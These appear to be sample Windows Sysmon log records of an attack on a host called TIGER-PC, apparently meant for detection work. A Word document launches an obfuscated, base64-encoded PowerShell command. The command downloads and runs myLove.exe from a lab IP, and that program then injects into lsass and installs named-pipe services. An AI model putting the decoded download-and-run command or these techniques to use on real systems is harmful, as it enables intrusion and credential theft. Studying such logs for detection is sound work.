<182>Jan 07 12:09:32 TIGER-PC AgentDevice=WindowsLog	AgentLogFile=Microsoft-Windows-Sysmon/Operational	PluginVersion=7.2.8.136	Source=Microsoft-Windows-Sysmon	Computer=TIGER-PC.example.com	OriginatingComputer=10.0.4.15	User=SYSTEM	Domain=NT AUTHORITY	EventID=1	EventIDCode=1	EventType=4	EventCategory=1	RecordNumber=73323	TimeGenerated=1546862971	ExperienceCenter=Sysmon	Level=Informational	Keywords=0x8000000000000000	Task=SysmonTask-SYSMON_CREATE_PROCESS	Opcode=Info	Message=Process Create: RuleName:  UtcTime: 2019-01-07 12:09:30.871 ProcessId: 3528 Image: C:\Windows\System32\calc.exe CommandLine: "C:\Windows\system32\calc.exe"  CurrentDirectory: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Accessories\ User: tiger-PC\tiger LogonId: 0x2591a TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=60B7C0FEAD45F2066E5B805A91F4F0FC ParentProcessId: 2480 ParentImage: C:\Windows\explorer.exe ParentCommandLine: C:\Windows\Explorer.EXE
<182>Jan 07 12:31:32 TIGER-PC AgentDevice=WindowsLog	AgentLogFile=Microsoft-Windows-Sysmon/Operational	PluginVersion=7.2.8.136	Source=Microsoft-Windows-Sysmon	Computer=TIGER-PC.example.com	OriginatingComputer=10.0.4.15	User=SYSTEM	Domain=NT AUTHORITY	EventID=1	EventIDCode=1	EventType=4	EventCategory=1	RecordNumber=74465	TimeGenerated=1546864289	ExperienceCenter=Sysmon	Level=Informational	Keywords=0x8000000000000000	Task=SysmonTask-SYSMON_CREATE_PROCESS	Opcode=Info	Message=Process Create: RuleName:  UtcTime: 2019-01-07 12:31:28.202 ProcessId: 2004 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe CommandLine: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"  CurrentDirectory: C:\Users\tiger\ User: tiger-PC\tiger LogonId: 0x2591a TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=EB32C070E658937AA9FA9F3AE629B2B8 ParentProcessId: 2480 ParentImage: C:\Windows\explorer.exe ParentCommandLine: C:\Windows\Explorer.EXE
<182>Jan 07 12:34:53 TIGER-PC AgentDevice=WindowsLog	AgentLogFile=Microsoft-Windows-Sysmon/Operational	PluginVersion=7.2.8.136	Source=Microsoft-Windows-Sysmon	Computer=TIGER-PC	OriginatingComputer=TIGER-PC	User=SYSTEM	Domain=NT AUTHORITY	EventID=10	EventIDCode=10	EventType=4	EventCategory=10	RecordNumber=24631	TimeGenerated=1546864491	ExperienceCenter=Sysmon	Level=Informational	Keywords=0x8000000000000000	Task=SysmonTask-SYSMON_ACCESS_PROCESS	Opcode=Info	Message=Process accessed: RuleName:  UtcTime: 2019-01-07 12:34:51 TargetImage: C:\Windows\system32\lsass.exe GrantedAccess: 0x1010 CallTrace: C:\Windows\SYSTEM32\ntdll.dll+45d94|C:\Windows\system32\KERNELBASE.dll+b3a2|UNKNOWN(00F818E1)|UNKNOWN(00F81B7D)|UNKNOWN(00F81E5E)|UNKNOWN(00F82AD8)|UNKNOWN(00F619C5)|UNKNOWN(00F615A1)|UNKNOWN(00F61A37)|UNKNOWN(00F614D9)|UNKNOWN(008B7486)|UNKNOWN(008B73A0)|UNKNOWN(008B78A3)|C:\Windows\system32\kernel32.dll+53c45|C:\Windows\SYSTEM32\ntdll.dll+637f5|C:\Windows\SYSTEM32\ntdll.dll+637c8
<182>Jan 07 12:41:44 TIGER-PC AgentDevice=WindowsLog	AgentLogFile=Microsoft-Windows-Sysmon/Operational	PluginVersion=7.2.8.136	Source=Microsoft-Windows-Sysmon	Computer=TIGER-PC.example.com	OriginatingComputer=10.0.4.15	User=SYSTEM	Domain=NT AUTHORITY	EventID=8	EventIDCode=8	EventType=4	EventCategory=8	RecordNumber=75017	TimeGenerated=1546864901	TimeWritten=1546864901	Level=Informational	Keywords=0x8000000000000000	Task=SysmonTask-SYSMON_CREATE_REMOTE_THREAD	Opcode=Info	Message=CreateRemoteThread detected: RuleName:  UtcTime: 2019-01-07 12:41:41.004 SourceProcessGuid: {40B85BEC-4852-5C33-0000-00100AA11200} SourceProcessId: 2228 SourceImage: C:\Users\tiger\AppData\Local\Temp\myLove.exe TargetProcessGuid: {40B85BEC-3BD8-5C33-0000-00107F690000} TargetProcessId: 496 TargetImage: C:\Windows\System32\lsass.exe NewThreadId: 2312 StartAddress: 0x00740000 StartModule:  ExperienceCenter=Sysmon
<182>Jan 07 12:41:44 TIGER-PC AgentDevice=WindowsLog	AgentLogFile=Microsoft-Windows-Sysmon/Operational	PluginVersion=7.2.8.136	Source=Microsoft-Windows-Sysmon	Computer=TIGER-PC.example.com	OriginatingComputer=10.0.4.15	User=SYSTEM	Domain=NT AUTHORITY	EventID=8	EventIDCode=8	EventType=4	EventCategory=8	RecordNumber=75018	TimeGenerated=1546864901	TimeWritten=1546864901	Level=Informational	Keywords=0x8000000000000000	Task=SysmonTask-SYSMON_CREATE_REMOTE_THREAD	Opcode=Info	Message=CreateRemoteThread detected: RuleName:  UtcTime: 2019-01-07 12:41:41.004 SourceProcessGuid: {40B85BEC-4852-5C33-0000-00100AA11200} SourceProcessId: 2228 SourceImage: C:\Users\tiger\AppData\Local\Temp\myLove.exe TargetProcessGuid: {40B85BEC-3BD8-5C33-0000-00107F690000} TargetProcessId: 496 TargetImage: C:\Windows\System32\lsass.exe NewThreadId: 2940 StartAddress: 0x00740000 StartModule:  ExperienceCenter=Sysmon
<182>Jan 07 12:29:08 TIGER-PC AgentDevice=WindowsLog	AgentLogFile=Microsoft-Windows-Sysmon/Operational	PluginVersion=7.2.8.136	Source=Microsoft-Windows-Sysmon	Computer=TIGER-PC.example.com	OriginatingComputer=10.0.4.15	User=SYSTEM	Domain=NT AUTHORITY	EventID=1	EventIDCode=1	EventType=4	EventCategory=1	RecordNumber=74360	TimeGenerated=1546864144	ExperienceCenter=Sysmon	Level=Informational	Keywords=0x8000000000000000	Task=SysmonTask-SYSMON_CREATE_PROCESS	Opcode=Info	Message=Process Create: RuleName:  UtcTime: 2019-01-07 12:29:04.706 ProcessId: 2736 Image: C:\Windows\System32\cmd.exe CommandLine: cmd.exe /c echo xgefyo > \\.\pipe\xgefyo CurrentDirectory: C:\Windows\system32\ User: NT AUTHORITY\SYSTEM LogonId: 0x3e7 TerminalSessionId: 0 IntegrityLevel: System Hashes: MD5=AD7B9C14083B52BC532FBA5948342B98 ParentProcessId: 488 ParentImage: C:\Windows\System32\services.exe ParentCommandLine: C:\Windows\system32\services.exe
<182>Jan 07 12:40:34 TIGER-PC AgentDevice=WindowsLog	AgentLogFile=System	PluginVersion=7.2.8.136	Source=Service Control Manager	Computer=TIGER-PC.example.com	OriginatingComputer=10.0.4.15	User=tiger	Domain=tiger-PC	EventID=1073748869	EventIDCode=7045	EventType=4	EventCategory=0	RecordNumber=3967	TimeGenerated=1546864832	TimeWritten=1546864832	Level=Informational	Keywords=EventlogClassic	Task=None	Opcode=Info	Message=A service was installed in the system.  Service Name:  anqibt  Service File Name:  cmd.exe /c echo anqibt > \\.\pipe\anqibt   Service Type:  user mode service Service Start Type:  demand start Service Account:  LocalSystem ExperienceCenter=Sysmon
<182>Jan 07 12:40:35 TIGER-PC AgentDevice=WindowsLog	AgentLogFile=Microsoft-Windows-Sysmon/Operational	PluginVersion=7.2.8.136	Source=Microsoft-Windows-Sysmon	Computer=TIGER-PC.example.com	OriginatingComputer=10.0.4.15	User=SYSTEM	Domain=NT AUTHORITY	EventID=1	EventIDCode=1	EventType=4	EventCategory=1	RecordNumber=74960	TimeGenerated=1546864832	ExperienceCenter=Sysmon	Level=Informational	Keywords=0x8000000000000000	Task=SysmonTask-SYSMON_CREATE_PROCESS	Opcode=Info	Message=Process Create: RuleName:  UtcTime: 2019-01-07 12:40:32.135 ProcessId: 3552 Image: C:\Windows\System32\cmd.exe CommandLine: cmd.exe /c echo anqibt > \\.\pipe\anqibt CurrentDirectory: C:\Windows\system32\ User: NT AUTHORITY\SYSTEM LogonId: 0x3e7 TerminalSessionId: 0 IntegrityLevel: System Hashes: MD5=AD7B9C14083B52BC532FBA5948342B98 ParentProcessId: 488 ParentImage: C:\Windows\System32\services.exe ParentCommandLine: C:\Windows\system32\services.exe
<182>Jan 07 12:38:44 TIGER-PC AgentDevice=WindowsLog	AgentLogFile=Microsoft-Windows-Sysmon/Operational	PluginVersion=7.2.8.136	Source=Microsoft-Windows-Sysmon	Computer=TIGER-PC.example.com	OriginatingComputer=10.0.4.15	User=SYSTEM	Domain=NT AUTHORITY	EventID=1	EventIDCode=1	EventType=4	EventCategory=1	RecordNumber=74884	TimeGenerated=1546864722	TimeWritten=1546864722	Level=Informational	Keywords=0x8000000000000000	Task=SysmonTask-SYSMON_CREATE_PROCESS	Opcode=Info	Message=Process Create: RuleName:  UtcTime: 2019-01-07 12:38:42.016 ProcessId: 2228 Image: C:\Users\tiger\AppData\Local\Temp\myLove.exe CommandLine: "C:\Users\tiger\AppData\Local\Temp\myLove.exe"  CurrentDirectory: C:\Users\tiger\Desktop\ User: tiger-PC\tiger LogonId: 0x2591a TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=A9B9581F5F7F0869915F9C6023F2F0AA ParentProcessId: 2040 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ExperienceCenter=Sysmon
<182>Jan 07 12:38:20 TIGER-PC AgentDevice=WindowsLog	AgentLogFile=Microsoft-Windows-Sysmon/Operational	Source=Microsoft-Windows-Sysmon		User=SYSTEM	omain=NT AUTHORITY	EventID=1	EventIDCode=1	EventType=4	EventCategory=1	Task=SysmonTask-SYSMON_CREATE_PROCESS	Message=Process Create: Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe CommandLine: powershell.exe  -ExecuTionPolicy ByPass -eNcoDe KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANQA2AC4ANAAvAG0AeQBMAG8AdgBlAC4AZQB4AGUAJwAsACAAIgBDADoAXABVAHMAZQByAHMAXAB0AGkAZwBlAHIAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAG0AeQBMAG8AdgBlAC4AZQB4AGUAIgApADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAIgBDADoAXABVAHMAZQByAHMAXAB0AGkAZwBlAHIAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAG0AeQBMAG8AdgBlAC4AZQB4AGUAIgA= CurrentDirectory: C:\Users\tiger\Desktop\ ParentImage: C:\Windows\System32\cmd.exe ExperienceCenter=Sysmon
<182>Jan 07 12:38:20 TIGER-PC AgentDevice=WindowsLog	AgentLogFile=Microsoft-Windows-Sysmon/Operational	PluginVersion=7.2.8.136	Source=Microsoft-Windows-Sysmon	Computer=TIGER-PC.example.com	OriginatingComputer=10.0.4.15	User=SYSTEM	Domain=NT AUTHORITY	EventID=1	EventIDCode=1	EventType=4	EventCategory=1	RecordNumber=74849	TimeGenerated=1546864696	ExperienceCenter=Sysmon	Level=Informational	Keywords=0x8000000000000000	Task=SysmonTask-SYSMON_CREATE_PROCESS	Opcode=Info	Message=Process Create: RuleName:  UtcTime: 2019-01-07 12:38:15.478 Image: C:\Windows\System32\cmd.exe CommandLine: cmd.exe /c powershell.exe -ExecuTionPolicy ByPass ^-^e^Nco^De KABOAGUAdwAtAE8AYg= CurrentDirectory: C:\Users\tiger\Desktop\ User: tiger-PC\tiger Hashes: MD5=AD7B9C14083B52BC532FBA5948342B98 ParentImage: C:\Program Files\Microsoft Office\Office16\WINWORD.EXE ParentCommandLine: "C:\Program Files\Microsoft Office\Office16\WINWORD.EXE" /n "C:\Users\tiger\Desktop\hello.docx" /o "u"